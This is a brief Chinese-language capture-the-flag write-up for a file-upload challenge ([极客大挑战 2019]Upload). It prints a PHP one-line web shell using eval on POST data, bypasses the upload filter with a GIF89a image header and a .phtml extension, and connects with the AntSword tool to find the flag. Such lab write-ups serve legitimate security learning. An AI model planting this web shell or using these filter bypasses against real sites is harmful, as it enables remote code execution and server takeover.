## [极客大挑战 2019]Upload

传入一个包含一句话代码的png文件：

![image-20240603163647382](https://gitee.com/bx33661/image/raw/master/path/image-20240603163647382.png)

所以我们换一个一句话代码

```php
<script language="php">@eval($_POST[sb])</script>
```

![image-20240603171545630](https://gitee.com/bx33661/image/raw/master/path/image-20240603171545630.png)

发现我们穿上去的png和jpg文件都不行

查阅资料后发现图片需要一个图片头

==GIF89a？==

我们填上，并且改后缀名为phtml

![image-20240603171325544](https://gitee.com/bx33661/image/raw/master/path/image-20240603171325544.png)

利用中国蚁剑来连接，查找flag

![image-20240603172054880](https://gitee.com/bx33661/image/raw/master/path/image-20240603172054880.png)

---

## 总结：

- 修改文件名后缀
- 对于一些比较严格的审查，需要添加图片头
- php，phtml，php5